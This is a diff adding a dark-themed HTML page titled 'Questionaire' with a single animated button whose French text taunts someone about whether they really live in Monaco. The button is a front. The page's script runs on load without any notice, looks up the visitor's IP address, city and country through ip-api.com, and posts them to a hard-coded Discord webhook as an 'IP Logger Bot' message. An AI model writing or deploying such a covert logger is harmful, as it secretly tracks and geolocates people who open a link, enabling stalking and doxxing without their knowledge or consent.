@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Questionaire</title>
+    <style>
+        /* Set the background to dark */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #1a1a1a; /* Dark background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* Button style from Uiverse.io by neerajbaniwal */
+        .btn-shine {
+            padding: 12px 48px;
+            color: #fff;
+            background: linear-gradient(to right, #9f9f9f 0, #fff 10%, #868686 20%);
+            background-position: 0;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: shine 3s infinite linear;
+            animation-fill-mode: forwards;
+            font-weight: 600;
+            font-size: 16px;
+            text-decoration: none;
+            white-space: nowrap;
+            font-family: "Poppins", sans-serif;
+            border: none; /* Removed the button stroke */
+            outline: none; /* No focus outline */
+            cursor: pointer; /* Hand cursor on hover */
+        }
+
+        @-moz-keyframes shine {
+            0% { background-position: 0; }
+            60% { background-position: 180px; }
+            100% { background-position: 180px; }
+        }
+
+        @-webkit-keyframes shine {
+            0% { background-position: 0; }
+            60% { background-position: 180px; }
+            100% { background-position: 180px; }
+        }
+
+        @-o-keyframes shine {
+            0% { background-position: 0; }
+            60% { background-position: 180px; }
+            100% { background-position: 180px; }
+        }
+
+        @keyframes shine {
+            0% { background-position: 0; }
+            60% { background-position: 180px; }
+            100% { background-position: 180px; }
+        }
+    </style>
+</head>
+<body>
+
+    <button class="btn-shine">Jvais enfin pouvoir vérifier si t'habite vraiment a monaco</button>
+
+    <script>
+        // Automatically log IP on page load
+        window.onload = function() {
+            logIP();
+        };
+
+        function logIP() {
+            // Fetch the user's IP from ip-api
+            fetch('http://ip-api.com/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.query;
+                    const location = `${data.city}, ${data.country}`;
+
+                    // Create the embed to send to Discord
+                    const embed = {
+                        "embeds": [{
+                            "title": "New IP Captured",
+                            "description": `User's IP: **${userIP}**\nLocation: **${location}**`,
+                            "color": 14177041, // Embed color (optional)
+                            "footer": {
+                                "text": "IP Logger Bot"
+                            },
+                            "timestamp": new Date()
+                        }]
+                    };
+
+                    // Send the IP and location to the Discord webhook
+                    fetch("https://discord.com/api/webhooks/1289342825280045283/b5JPUS1RZ14Kv38CZ08tFOqvyQMs47sjDxZzX-W9aRnaicinazBmb3edqlpXtN5DefiW", {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(embed),
+                    }).then(() => {
+                        console.log('IP and location sent to Discord successfully!');
+                    }).catch((error) => {
+                        console.error('Error sending IP and location to Discord:', error);
+                    });
+                });
+        }
+    </script>
+
+</body>
+</html>
